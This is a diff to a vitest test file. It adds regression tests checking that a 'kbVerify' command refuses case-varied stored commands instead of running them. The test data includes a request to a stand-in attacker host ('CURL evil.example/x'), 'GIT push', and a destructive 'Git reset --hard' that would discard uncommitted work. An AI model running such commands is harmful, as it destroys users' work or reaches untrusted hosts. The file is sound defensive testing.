@@ -14,9 +14,10 @@
  * @see PLAN-M10.md P20
  * @see PLAN-M14.md P28
  */
-import { mkdir, writeFile } from 'node:fs/promises';
+import { mkdir, readFile, writeFile } from 'node:fs/promises';
 import path from 'node:path';
 
+import { execa } from 'execa';
 import { afterEach, describe, expect, it } from 'vitest';
 
 import { kbVerify, type KbCommandContext } from '../../src/commands/kb.ts';
@@ -195,6 +196,46 @@ describe('kbVerify: a hostile stored command is refused, never run (PLAN-M14.md 
 
     expect(findings[0]?.outcome).toBe('refused');
     expect(findings[0]?.detail).toMatch(/^refused \(/);
+  });
+
+  it('a case-varied command is refused too, not silently allowed through by the real OS resolving it anyway', async () => {
+    // A round-1 critic found `vetNetworkAndArguments`'s own program-name lookup un-lowercased, so a
+    // case-varied network/git/rg/tree command ran completely unrefused -- proved destructively below.
+    // This one exercises the same gap through the real, public `kbVerify()` entry point for several
+    // shapes at once, confined-command.test.ts's own `vetStoredCommand` matrix covers the unit level.
+    const project = await createTestProject();
+    await writeVerifiedEntryWithCommand(project, 'KB-ARCH-0110', 'GIT push');
+    await writeVerifiedEntryWithCommand(project, 'KB-ARCH-0111', 'CURL evil.example/x');
+
+    const findings = await kbVerify(ctx(project));
+
+    const byId = new Map(findings.map((f) => [f.id, f.outcome]));
+    expect(byId.get('KB-ARCH-0110')).toBe('refused');
+    expect(byId.get('KB-ARCH-0111')).toBe('refused');
+  });
+
+  it('a case-varied destructive git command is refused, never run: real uncommitted work survives a real kbVerify() call', async () => {
+    // The exact real, destructive proof a round-1 critic demonstrated against the pre-fix code: a KB
+    // entry naming `Git reset --hard` (capital G) silently discarded real uncommitted work and reported
+    // `outcome: 'pass'`. Reproduced here as a permanent regression test, with the fix in place.
+    const project = await createTestProject();
+    await execa('git', ['init', '--quiet', '-b', 'main'], { cwd: project.dir });
+    await execa('git', ['config', 'user.email', 'test@example.com'], { cwd: project.dir });
+    await execa('git', ['config', 'user.name', 'Test'], { cwd: project.dir });
+    const preciousPath = path.join(project.dir, 'precious.txt');
+    await writeFile(preciousPath, 'committed baseline\n');
+    await execa('git', ['add', 'precious.txt'], { cwd: project.dir });
+    await execa('git', ['commit', '--quiet', '-m', 'baseline'], { cwd: project.dir });
+    // Real, uncommitted work sitting in the tree -- exactly what `Git reset --hard` would discard.
+    await writeFile(preciousPath, 'UNCOMMITTED WORK ABOUT TO BE WIPED\n');
+    await writeVerifiedEntryWithCommand(project, 'KB-ARCH-0112', 'Git reset --hard');
+
+    const findings = await kbVerify(ctx(project));
+
+    expect(findings[0]?.outcome).toBe('refused');
+    expect(findings[0]?.detail).toMatch(/^refused \(dangerous-argument\)/);
+    // The uncommitted work is untouched -- the command never ran.
+    expect(await readFile(preciousPath, 'utf8')).toBe('UNCOMMITTED WORK ABOUT TO BE WIPED\n');
   });
 
   it('a command that reaches a remote under network: none is refused', async () => {
